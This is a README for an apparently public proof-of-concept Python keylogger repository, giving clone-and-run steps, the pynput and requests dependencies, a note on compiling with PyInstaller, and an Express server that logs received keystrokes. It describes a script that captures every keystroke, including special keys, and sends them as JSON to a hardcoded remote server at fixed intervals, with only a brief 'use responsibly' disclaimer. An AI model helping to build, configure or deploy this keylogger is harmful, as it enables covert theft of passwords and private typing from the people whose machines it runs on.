# Keylogger (Proof of Concept)
This is a proof-of-concept keylogger project. It demonstrates basic functionality and can be improved in various ways. Use responsibly and only in ethical, legal contexts.
Prerequisites

    Python 3.x installed

    Git installed

    Microsoft C/C++ compiler (for PyInstaller compilation on Windows)

Setup Instructions

   1. Clone the Repository
    Run the following command to clone the repository:
    

    git clone https://github.com/Lamona1226/keylogger.git

   2. Navigate to the Project Directory
    Change to the project directory:
    

    cd python-keylogger

  3.Create a Virtual Environment
  Create a virtual environment to isolate dependencies:
    

    python -m venv keylogger_env

  4.Activate the Virtual Environment
    Activate the virtual environment:

   On Windows:
        

    keylogger_env\Scripts\activate

  On macOS/Linux:
        

    source keylogger_env/bin/activate

   5. Install Required Packages
    Install the necessary dependencies:
    

    pip install -r requirements.txt

  6.  Run the Keylogger
    Execute the keylogger script:
    

    python keylogger.py

# How to Use the Keylogger Code

This Python script captures keystrokes and sends them to a remote server at regular intervals. Below are the steps to set up and use the code:
Prerequisites

1.Install the pynput library to capture keyboard inputs:
 

    pip install pynput

   2. Ensure the requests library is installed for sending HTTP POST requests:
    

    pip install requests

Code Overview

    The script captures keystrokes using the pynput library.

    Captured keystrokes are stored in a string and sent to a remote server as a JSON payload.

    The server's IP address, port number, and time interval for sending data are hardcoded in the script.

    The script handles special keys like Enter, Tab, Space, Shift, Backspace, and Escape.

Steps to Run the Code

   1. Update Server Details:
    Replace the ip_address and port_number variables in the script with your server's IP address and port.
    Example:
   

    ip_address = "your_server_ip"
    port_number = "your_server_port"

  2.  Set Time Interval:
    Adjust the time_interval variable to specify how often (in seconds) the captured keystrokes should be sent to the server.
    Example:
   

    time_interval = 10  # Sends data every 10 seconds

   3. Run the Script:
    Execute the script using Python:
  

    python keylogger.py

    Monitor Keystrokes:
    The script will capture keystrokes and send them to the specified server at the defined interval.

        Special keys like Enter, Tab, and Backspace are handled appropriately.

        The script stops capturing keystrokes if the Escape key is pressed.

Example Server Setup

To test the script, you can set up a simple HTTP server using Node.js (Express) or Python (Flask) to receive the POST requests. Here’s an example using Express:

    const express = require('express');
    const app = express();
    app.use(express.json());
    
    app.post('/', (req, res) => {
        console.log(req.body); // Logs the received keystrokes
        res.sendStatus(200);
    });
    
    app.listen(8080, () => {
        console.log('Server is running on port 8080');
    });

OR USE MY express-server
